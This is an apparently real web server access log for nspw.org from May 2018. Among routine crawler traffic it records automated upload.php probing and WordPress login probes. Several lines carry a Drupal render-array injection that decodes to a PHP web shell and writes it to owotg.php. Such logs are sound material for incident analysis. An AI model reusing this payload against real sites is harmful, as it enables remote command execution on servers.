www.nspw.org:80 194.187.251.6 - - [02/May/2018:19:37:19 -0400] "GET /node/70 HTTP/1.1" 302 543 "http://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:22 -0400] "GET /foro/chat/temp/fa505.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:33 -0400] "POST /islamski-chat/upload.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:36 -0400] "GET /islamski-chat/temp/fa505.php HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:42 -0400] "POST /chat-sem-registo/upload.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:42 -0400] "GET /chat-sem-registo/temp/fa505.php HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:42 -0400] "POST /chat55/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:50 -0400] "GET /chat55/temp/fa505.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:56 -0400] "POST /flashchat-2/upload.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:57 -0400] "GET /flashchat-2/temp/fa505.php HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:37:59 -0400] "POST /cchat/chat/upload.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:38:00 -0400] "GET /cchat/chat/temp/fa505.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:38:00 -0400] "POST /xfchat/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:38:02 -0400] "GET /xfchat/temp/fa505.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:38:14 -0400] "POST /chatroom/upload.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:38:34 -0400] "GET /chatroom/temp/fa505.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:38:54 -0400] "POST /radiodalmatino/upload.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:38:54 -0400] "GET /radiodalmatino/temp/fa505.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:39:02 -0400] "POST /blog-chat/chat/upload.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:39:03 -0400] "GET /blog-chat/chat/temp/fa505.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:39:11 -0400] "POST /FlashChat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:39:11 -0400] "GET /FlashChat/temp/fa505.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:39:25 -0400] "POST /blog-chat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 54.36.148.146 - - [02/May/2018:19:39:25 -0400] "GET /papers/2005/?C=S;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:39:40 -0400] "GET /blog-chat/temp/fa505.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:39:54 -0400] "POST /tag/flashchat-v6-0-8/upload.php HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:10 -0400] "GET /tag/flashchat-v6-0-8/temp/fa505.php HTTP/1.1" 302 543 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:17 -0400] "POST /deface_flashchat/upload.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:17 -0400] "GET /deface_flashchat/temp/fa505.php HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:40:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:24 -0400] "POST /topic/page/upload.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:24 -0400] "GET /topic/page/temp/fa505.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:33 -0400] "POST /page/video/upload.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:33 -0400] "GET /page/video/temp/fa505.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 54.36.149.95 - - [02/May/2018:19:40:44 -0400] "GET /2009/proceedings/1999/?C=S;O=A HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:53 -0400] "POST /vid/watch/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:53 -0400] "GET /vid/watch/temp/fa505.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:56 -0400] "POST /tutaf/upload.php HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:57 -0400] "GET /tutaf/temp/fa505.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:57 -0400] "POST /baixar/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:40:57 -0400] "GET /baixar/temp/fa505.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:41:19 -0400] "POST /how-to-install-flashchat-free/upload.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:41:19 -0400] "GET /how-to-install-flashchat-free/temp/fa505.php HTTP/1.1" 302 561 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:41:29 -0400] "POST /music-search/upload.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:41:29 -0400] "GET /music-search/temp/fa505.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:41:39 -0400] "POST /search/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:41:39 -0400] "GET /search/temp/fa505.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:19:41:42 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:41:47 -0400] "POST /mp3/list/upload.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:41:50 -0400] "GET /mp3/list/temp/fa505.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:41:54 -0400] "POST /jingyan/upload.php HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:41:57 -0400] "GET /jingyan/temp/fa505.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:42:01 -0400] "POST /exploit/description/upload.php HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:19:42:04 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:42:20 -0400] "GET /exploit/description/temp/fa505.php HTTP/1.1" 302 541 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:42:36 -0400] "POST /exploits/28709/upload.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:42:37 -0400] "GET /exploits/28709/temp/fa505.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:42:52 -0400] "POST /radiopoljubac/posts/upload.php HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 207.46.13.1 - - [02/May/2018:19:42:53 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:43:16 -0400] "GET /radiopoljubac/posts/temp/fa505.php HTTP/1.1" 302 541 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 144.76.162.206 - - [02/May/2018:19:43:26 -0400] "GET /papers/1993/nspw1993-hosmer.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:43:39 -0400] "POST /m/upload.php HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 5.9.145.132 - - [02/May/2018:19:43:40 -0400] "GET /papers/1993/nspw1993-hosmer.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:43:48 -0400] "GET /m/temp/fa505.php HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:43:50 -0400] "POST /m/video/upload.php HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:43:52 -0400] "GET /m/video/temp/fa505.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 5.9.94.207 - - [02/May/2018:19:43:54 -0400] "GET /papers/1993/nspw1993-hosmer.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:44:15 -0400] "POST /upload.php HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:44:26 -0400] "GET /temp/fa505.php HTTP/1.1" 302 501 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:44:35 -0400] "POST /okolice-ilawa/chat/upload.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:44:36 -0400] "GET /okolice-ilawa/chat/temp/fa505.php HTTP/1.1" 302 539 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:45:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 201.35.252.168 - - [02/May/2018:19:46:17 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 201.35.252.168 - - [02/May/2018:19:46:20 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.23.174.51 - - [02/May/2018:19:46:36 -0400] "GET /2018 HTTP/1.1" 302 500 "-" "LWP::Simple/6.29 libwww-perl/6.29"
www.nspw.org:80 182.186.175.252 - - [02/May/2018:19:47:08 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 182.186.175.252 - - [02/May/2018:19:47:11 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 177.73.199.239 - - [02/May/2018:19:47:13 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 199.16.157.183 - - [02/May/2018:19:48:40 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.183 - - [02/May/2018:19:48:41 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 54.67.59.131 - - [02/May/2018:19:48:55 -0400] "GET / HTTP/1.1" 302 473 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
www.nspw.org:80 66.249.64.206 - - [02/May/2018:19:50:07 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:50:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:19:52:09 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 34.229.167.12 - - [02/May/2018:19:53:46 -0400] "GET /2018 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
www.nspw.org:80 185.232.20.242 - - [02/May/2018:19:53:50 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [02/May/2018:19:53:50 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [02/May/2018:19:53:50 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 5.34.85.85 - - [02/May/2018:19:54:02 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 5.34.85.85 - - [02/May/2018:19:54:07 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 207.46.13.179 - - [02/May/2018:19:55:16 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 302 585 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:55:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 24.190.116.37 - - [02/May/2018:19:58:11 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 24.190.116.37 - - [02/May/2018:19:58:12 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 54.36.148.110 - - [02/May/2018:19:58:33 -0400] "GET /2009/proceedings/2003/?C=N;O=D HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:59:03 -0400] "GET /proceedings/2011 HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 120.29.106.86 - - [02/May/2018:20:00:14 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 120.29.106.86 - - [02/May/2018:20:00:15 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:00:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 35.226.23.240 - - [02/May/2018:20:00:28 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "ltx71 - (http://ltx71.com/)"
www.nspw.org:80 54.36.148.109 - - [02/May/2018:20:01:42 -0400] "GET /2010/organizers HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:20:01:59 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:20:01:59 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 77.75.76.164 - - [02/May/2018:20:02:30 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.76.164 - - [02/May/2018:20:02:34 -0400] "GET /papers/2012/forms/index_files/banner.jpg HTTP/1.1" 302 609 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.76.164 - - [02/May/2018:20:02:35 -0400] "GET /2009/papers.content HTTP/1.1" 302 566 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.76.164 - - [02/May/2018:20:02:36 -0400] "GET /2001/past.html HTTP/1.1" 302 556 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.76.164 - - [02/May/2018:20:02:36 -0400] "GET /2006/ HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.76.164 - - [02/May/2018:20:02:37 -0400] "GET /2012 HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.76.164 - - [02/May/2018:20:02:37 -0400] "GET /2016 HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.126.150.181 - - [02/May/2018:20:02:49 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 77.126.150.181 - - [02/May/2018:20:02:50 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:20:02:57 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 302 599 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:05:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 91.242.17.127 - - [02/May/2018:20:06:55 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 91.242.17.127 - - [02/May/2018:20:06:59 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 36.110.211.41 - - [02/May/2018:20:07:28 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:20:10:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 112.205.65.218 - - [02/May/2018:20:10:24 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 112.205.65.218 - - [02/May/2018:20:10:26 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 54.36.148.246 - - [02/May/2018:20:12:02 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
